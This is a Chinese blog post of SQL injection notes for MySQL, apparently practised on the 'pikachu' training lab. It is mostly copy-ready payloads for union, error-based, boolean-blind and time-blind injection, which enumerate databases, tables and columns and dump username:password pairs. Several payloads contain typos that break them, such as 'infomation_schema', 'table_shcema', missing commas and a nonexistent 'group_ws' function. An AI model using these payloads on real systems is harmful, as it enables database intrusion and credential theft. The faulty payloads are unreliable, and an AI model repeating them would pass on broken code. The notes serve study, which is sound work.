<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="数据库注入, Home">
    <meta name="description" content="[TOC]
MySql联合查询12345678910111213141516171819202122232425262728293031323334353637# 需要使用的函数concat() 	# 将多个字串连接为一行输出group_c">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>数据库注入 | Home</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Home" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Home</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Home</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/aisibuhuipao/aisibuhuipao.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/aisibuhuipao/aisibuhuipao.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">数据库注入</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="container content">

    
    <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/mysql/">
                                <span class="chip bg-color">mysql</span>
                            </a>
                        
                            <a href="/tags/sqlserver/">
                                <span class="chip bg-color">sqlserver</span>
                            </a>
                        
                            <a href="/tags/access/">
                                <span class="chip bg-color">access</span>
                            </a>
                        
                            <a href="/tags/oracle/">
                                <span class="chip bg-color">oracle</span>
                            </a>
                        
                            <a href="/tags/mongodb/">
                                <span class="chip bg-color">mongodb</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-02-20
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    10.2k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>[TOC]</p>
<h2 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 需要使用的函数</span><br><span class="line">concat() 	# 将多个字串连接为一行输出</span><br><span class="line">group_concat() 	# 可以配合 group by asc/desc 使用</span><br><span class="line">group_ws() 	# 增加分隔符号并将字串连接为一行输出</span><br><span class="line">version() 	# 显示版本</span><br><span class="line">database() 	# 显示当前数据库</span><br><span class="line">union select 	# 联合查询</span><br><span class="line">information_schema.schemata 	# 存储所有库名的位置</span><br><span class="line">schema_name 	# 查库名</span><br><span class="line">table_name 		# 查表名</span><br><span class="line">column_name 	# 查字段名</span><br><span class="line">distinct() 		# 去重</span><br><span class="line">limit 1,1 		# 从第 N 条记录开始, 返回 M 条记录</span><br><span class="line"></span><br><span class="line"># 判断注入</span><br><span class="line">?id=0'"\)]}--+		# 判断是否是字符型和闭合情况</span><br><span class="line">?id=0 and 1=1	# 盘点是否是数字型</span><br><span class="line"># 判断显示字段数</span><br><span class="line">?id=0' order by 3 --+	# 回显正常为正确字段数</span><br><span class="line"># 判断显示位置</span><br><span class="line">?id=0' union select 1,2,3 --+</span><br><span class="line"># 查看数据库版本,和当前数据库名</span><br><span class="line">?id=0' union select 1,database(),version() --+</span><br><span class="line"># 查看所有数据库名</span><br><span class="line">?id=0' union select 1,2,schema_name from information_schema.schemata limit 1,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br><span class="line"># 查看数据库的表名和当前数据库的表名</span><br><span class="line">?id=0' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' --+</span><br><span class="line"># 查看表中字段名</span><br><span class="line">?id=0' union select 1,2 column_name from information_schema.columns where table_name='表名' limit 0,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+</span><br><span class="line"># 查看表中数据</span><br><span class="line">?id=0' union select 1,2,group_concat(字段,": ",字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,2,group_ws("~",字段,字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,2,concat(字段,字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,字段1,字段2 from 表名 limit 0,1--+</span><br></pre></td></tr></tbody></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入,只显示32位长度的数据</span><br><span class="line"># 报错注入使用的函数</span><br><span class="line">extractvalue(参数1,参数2) 	# 参数1表示操作的目标XML文档，参数2则表示目标XML的查找路径。</span><br><span class="line">updatexml(参数1,参数2,参数3)	    # XML文档,路径,替换值,原理和 extractvalue() 是相同的</span><br><span class="line">substr(1,30) 	# 截断字串位数, 1 起始位置, 30 长度</span><br><span class="line"># 查看库</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infomation_schema.tables where table_schema='库名')0x7e)) or'</span><br><span class="line"># 查看表,截断32位显示</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_shcema='库名' limit 0,1),32),0x7e)) or'</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from infomation_schema.columns where table_name='表名' limit 0,1),32),0x7e)) or'</span><br><span class="line"># updatexml 报错注入 查看字段</span><br><span class="line">?id=0' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_name='表名'),32)0x7e),0) or'</span><br><span class="line"># 查看表中数据</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(字段1,": "字段2) from 表名 limit 0,1),32),0x7e)) or'</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># floor报错注入和前面两个函数不同，floor函数报错注入的原理涉及到以下几个函数：</span><br><span class="line">1. floor()：小数向下取整数（向上取整数是ceiling()函数）</span><br><span class="line">2. rand()：随机返回0 ~ 1之间的小数</span><br><span class="line">3. concat_ws()：将括号内的数据用第一个字段连接起来</span><br><span class="line">4. group by子句：分组语句，常用于结合统计函数，根据一个列或多个列，对结果集进行分组</span><br><span class="line">5. as：就是别名</span><br><span class="line">6. count函数：汇总统计数量</span><br><span class="line">7. limit：显示指定行数</span><br><span class="line"># </span><br></pre></td></tr></tbody></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 判断当前库名长度和所有库名的长度</span><br><span class="line">?id=0' and length(database())&gt;5 --+</span><br><span class="line">?id=0' and length((select group_concat(schema_name) from</span><br><span class="line">information_schema.schemata))=90--+</span><br><span class="line"># 判断当前库名</span><br><span class="line">?id=0' and (substr(database(),1,1))&gt;'a' --+</span><br><span class="line">?id=0' and ascii(substr(database(),1,1))&gt;100 --+</span><br><span class="line">?id=0' and ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1,1))=112 --+</span><br><span class="line"># 判断表</span><br><span class="line">?id=0' and ascii(substr((select group_concat(table_name) from information_schema.tables limit 0,1),1,1))=112 --+</span><br><span class="line"># 判断字段</span><br><span class="line">?id=0' and ascii(substr((select group_concat(column_name) from information_schema.columns limit 0,1),1,1))=112 --+</span><br></pre></td></tr></tbody></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 布尔的payload 套一层 if slee() 就可以变成 时间盲注</span><br><span class="line"># 语法1. sleep()函数:让数据库暂停n秒, if(select database(),sleep(5),1)</span><br><span class="line"># 语法2. benchmark()函数:命令执行次数, benchmark(50000000,md5('1'))</span><br><span class="line"># 判断注入</span><br><span class="line">?id=0' and sleep(5) --+</span><br><span class="line">?id=0' and benchmark(50000,md5('1'))--+</span><br><span class="line"># 判断库名长度</span><br><span class="line">?id=0' and if(length((select group_concat(schema_name) from information_schema.schemata))=90,sleep(5),0) --+</span><br><span class="line"># 判断库名</span><br><span class="line">?id=0' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),71,1))=112,sleep(5),0) --+</span><br></pre></td></tr></tbody></table></figure>

<h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a><strong>token防爆破</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116364.png" alt="image-20220206180531938"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116031.png" alt="image-20220206180509330"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116941.png" alt="image-20220206180616794"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116982.png" alt="image-20220206181026584"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116904.png" alt="image-20220206181047274"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116673.png" alt="image-20220206181134849"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116202.png" alt="image-20220206181146506"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116132.png" alt="image-20220206181348236"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116363.png" alt="image-20220206181600606"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116926.png" alt="image-20220206181733746"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120827.png" alt="image-20220206181825835"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120918.png" alt="image-20220206181843657"></p>
<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a><strong>搜索型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%		//判断回显用户</span><br><span class="line">vi%' order by 3 #	//判断字段数</span><br><span class="line">vi%' union select 1,2,3 #		//回显点</span><br><span class="line">vi%' union select version(),database(),3 #		//版本和当前库名</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120259.png" alt="image-20220206195611524"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120752.png" alt="image-20220206201152078"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120192.png" alt="image-20220206201304437"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">所有库</span><br><span class="line">vi%' union select 1,2,group_concat(schema_name) from information_schema.schemata #</span><br><span class="line">爆表</span><br><span class="line">vi%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">爆字段</span><br><span class="line">vi%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #</span><br><span class="line">爆内容</span><br><span class="line">vi%' union select 1,2,group_concat(username,": ",password) from users #</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120502.png" alt="image-20220206201836920"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120054.png" alt="image-20220206202317937"></p>
<h4 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a><strong>xx型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1') or 1=1 #	//判断注入</span><br><span class="line">1') order by 2 #		//判断字段数</span><br><span class="line">1') union select 1,2 #		//判断回显点</span><br><span class="line">1') union select version(),database() #		//版本和当前库名</span><br><span class="line">//所有库</span><br><span class="line">1') union select 1,group_concat(schema_name) from information_schema.schemata #</span><br><span class="line">//爆表</span><br><span class="line">1') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">//爆字段</span><br><span class="line">1') union select 1,group_concat(column_name) from information_schema.columns where table_name= 'users' #</span><br><span class="line">//爆内容</span><br><span class="line">1') union select 1,group_concat(username,": ",password) from users #</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120465.png" alt="image-20220206203126592"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120123.png" alt="image-20220206203255820"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120603.png" alt="image-20220206203430444"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120748.png" alt="image-20220206204158481"></p>
<h4 id="insert型注入"><a href="#insert型注入" class="headerlink" title="insert型注入"></a><strong>insert型注入</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120316.png" alt="image-20220206205311630"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120998.png" alt="image-20220206205337892"></p>
<h4 id="报错注入-extractvalue"><a href="#报错注入-extractvalue" class="headerlink" title="报错注入 extractvalue"></a><strong>报错注入 extractvalue</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">123'and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '</span><br><span class="line">爆表</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit+0,1),0x7e)) or'	//前面32位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit 0,1),32),0x7e)) or'		//最后几位</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120573.png" alt="image-20220206205604457"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120595.png" alt="image-20220206205955260"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120585.png" alt="image-20220206210157224"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e)) or'		//前面0-32位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),32),0x7e)) or'	//中间32-64位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),64),0x7e)) or'	//64-96</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),96),0x7e)) or'	//最后</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120355.png" alt="image-20220206210857784"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e)) or'</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),64),0x7e)) or'</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),96),0x7e)) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120512.png" alt="image-20220206211030191"></p>
<h4 id="update型注入"><a href="#update型注入" class="headerlink" title="update型注入"></a><strong>update型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">1'and updatexml(1,concat(0x7e,database()),0) or'</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema="pikachu"),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema="pikachu"),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name="users"),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段内容</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119002.png" alt="image-20220206212343188"></p>
<h4 id="datele注入"><a href="#datele注入" class="headerlink" title="datele注入"></a><strong>datele注入</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119273.png" alt="image-20220206212501799"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119879.png" alt="image-20220206212553298"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">1 and updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119535.png" alt="image-20220206213130375"></p>
